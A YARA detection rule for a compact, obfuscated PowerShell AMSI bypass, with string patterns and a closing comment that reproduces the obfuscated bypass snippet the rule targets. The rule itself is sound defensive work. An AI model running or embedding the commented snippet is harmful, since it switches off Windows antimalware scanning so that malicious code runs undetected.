rule PS_AMSI_Bypass_Compact {
	meta:
		author = "James E.C, mastodon: @ozurie@infosec.exchange, twitter: @sudosev"
		reference = "https://twitter.com/cyb3rops/status/1588574518057979905/photo/1"
	strings:
		$k1 = "|%{[char][" ascii nocase
		$k2 = "+($" ascii
		$s1 = ".Assembly.GetType([" ascii nocase
		$s2 = "SetValue(" ascii nocase
		$s3 = "GetField([" ascii nocase
		$s4 = "-replace" ascii nocase
	condition:
		filesize < 100KB and all of ($k*) and 2 of ($s*)
}

/*
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'Non' + 'Public,Static').
SetValue($null,$true)
*/
